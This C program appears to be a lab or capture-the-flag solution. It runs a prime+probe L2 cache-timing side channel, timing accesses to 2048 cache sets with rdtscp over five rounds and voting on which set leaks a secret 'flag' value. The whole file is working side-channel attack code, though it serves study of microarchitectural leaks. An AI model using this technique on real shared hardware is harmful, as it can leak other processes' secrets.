#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BUFF_SIZE (2 * 1024 * 1024)  // 2MB Hugepage
#define CACHE_LINE_SIZE 64
#define NUM_L2_CACHE_SETS 2048
#define PROBES 30
#define WAYS 32        // <--- increased ways to 32
#define NUM_GUESSES 5  // how many guesses to make total
#define PAGE_STRIDE (4096 * 8)  // <--- bigger stride

// Manual rdtscp inline function
static inline uint64_t rdtscp() {
    uint32_t lo, hi;
    __asm__ volatile (
        "rdtscp"
        : "=a" (lo), "=d" (hi)
        :
        : "%rcx"
    );
    return ((uint64_t)hi << 32) | lo;
}

int main(int argc, char const *argv[]) {
    int votes[NUM_L2_CACHE_SETS] = {0};
    int final_flag = -1;

    // Step 1: Allocate hugepage memory
    uint8_t *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap failed");
        exit(1);
    }
    memset(buf, 0, BUFF_SIZE);

    for (int guess_round = 0; guess_round < NUM_GUESSES; guess_round++) {
        uint64_t times[NUM_L2_CACHE_SETS] = {0};

        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            uint64_t total_time = 0;
            for (int i = 0; i < PROBES; i++) {
                uint64_t start = rdtscp();
                for (int way = 0; way < WAYS; way++) {
                    volatile uint8_t *addr = buf + (set * CACHE_LINE_SIZE) + (way * PAGE_STRIDE);  // <-- fixed here
                    *addr;
                }
                uint64_t end = rdtscp();
                total_time += (end - start);
            }
            times[set] = total_time / PROBES;
        }

        // Find the set with maximum latency
        int guessed_flag = 0;
        uint64_t max_time = 0;
        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            if (times[set] > max_time) {
                max_time = times[set];
                guessed_flag = set;
            }
        }

        votes[guessed_flag]++;
        printf("[Round %d] Guessed flag: %d\n", guess_round + 1, guessed_flag);
        usleep(500000);  // sleep 0.5 seconds between rounds
    }

    // Find which flag got most votes
    int max_votes = 0;
    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        if (votes[set] > max_votes) {
            max_votes = votes[set];
            final_flag = set;
        }
    }

    printf("Final Flag: %d (with %d votes)\n", final_flag, max_votes);
    return 0;
}
